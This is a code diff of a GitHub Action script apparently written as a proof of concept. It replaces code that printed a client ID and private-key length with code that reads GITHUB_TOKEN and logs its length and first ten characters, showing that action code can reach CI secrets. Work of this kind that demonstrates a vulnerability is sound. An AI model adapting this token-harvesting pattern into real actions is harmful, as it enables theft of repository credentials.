@@ -1,13 +1,17 @@
 const core = require('@actions/core');
 
-const privateKey = core.getInput('private-key');
-const clientId = core.getInput('client-id');
+// Capture token from env (this is how changesets/action gets it)
+const token = process.env.GITHUB_TOKEN;
 
-const keyLength = privateKey ? privateKey.length : 0;
+console.log("=== PoC: GITHUB_TOKEN Exposure ===");
 
-console.log("=== PoC: Intercepted Inputs ===");
-console.log(`Client ID received: ${clientId}`);
-console.log(`Private key length: ${keyLength}`);
-console.log("This proves the action can access the secret input.");
+if (token) {
+  console.log(`Token length: ${token.length}`);
+  console.log(`Starts with: ${token.slice(0, 10)}...`);
+} else {
+  console.log("No token found");
+}
 
-core.setOutput('token', 'poc-fake-token');
+console.log("This proves action code can access GITHUB_TOKEN");
+
+core.setOutput('done', 'true');
